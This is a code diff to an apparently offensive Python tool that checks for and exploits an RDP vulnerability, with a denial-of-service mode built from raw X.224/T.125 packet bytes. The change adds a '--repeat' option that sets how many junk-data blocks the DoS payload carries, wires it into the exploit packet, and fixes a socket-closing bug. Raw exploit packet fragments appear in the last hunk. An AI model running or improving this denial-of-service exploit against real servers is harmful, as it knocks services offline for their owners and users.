@@ -48,6 +48,12 @@ target_group.add_argument(
     default=10,
     help='Number of threads (default: 10)'
 )
+target_group.add_argument(
+    '--repeat',
+    type=int,
+    default=16,
+    help='DoS: Repeat count of junk data (default: 16)'
+)
 
 action_group = parser.add_argument_group('Action Options', 'Execution mode (choose one only)')
 action_group_exclusive = action_group.add_mutually_exclusive_group(required=True)
@@ -158,7 +164,7 @@ def do_check(ip: str, port: int):
         res = sock.recv(1024)
         if len(res) < 11:
             print('[-] No valid response to second userRequest.')
-            s.close()
+            sock.close()
             return False
 
         user2 = int.from_bytes(res[9:11], byteorder='big')
@@ -255,7 +261,7 @@ def do_dos(ip: str, port: int):
         b'\x02\xF0\x80'         # X.224
         b'\x28'                 # T.125
     )
-    repeated_chunks = single_repeat_block * 16
+    repeated_chunks = single_repeat_block * args.repeat
 
     tail_exploit_pkt = (
         b'\x03\x00\x00\x0C'
